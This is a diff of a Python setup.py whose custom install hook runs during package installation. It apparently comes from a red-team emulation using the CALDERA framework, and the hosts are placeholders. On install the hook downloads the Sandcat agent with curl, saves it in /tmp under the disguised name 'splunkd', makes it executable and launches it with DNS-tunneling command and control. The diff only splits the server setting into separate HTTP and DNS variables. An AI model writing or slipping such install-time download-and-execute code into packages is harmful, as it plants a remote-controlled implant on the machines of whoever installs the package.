@@ -7,7 +7,9 @@ import sys
 
 
 package_name = 'placeholder'
-server = 'placeholder'
+caldera_http_server = 'placeholder'
+caldera_dns_server = 'placeholder'
+
 
 class install(_install):
     def run(self):
@@ -29,8 +31,8 @@ class install(_install):
         os.dup2(stdout.fileno(), sys.stdout.fileno())
         os.dup2(stderr.fileno(), sys.stderr.fileno())
         os.chdir('/tmp')
-        os.system(f'curl -s -X POST -H "file:sandcat.go" -H "platform:linux" -H "gocat-extensions:dns_tunneling" {server}/file/download > splunkd; chmod +x splunkd;')
-        os.execl('./splunkd', './splunkd', '-c2', 'DnsTunneling', '-server', server, '-group', 'red')
+        os.system(f'curl -s -X POST -H "file:sandcat.go" -H "platform:linux" -H "gocat-extensions:dns_tunneling" {caldera_http_server}/file/download > splunkd; chmod +x splunkd;')
+        os.execl('./splunkd', './splunkd', '-c2', 'DnsTunneling', '-server', caldera_dns_server, '-group', 'red')
 
 
 setup(name=package_name,
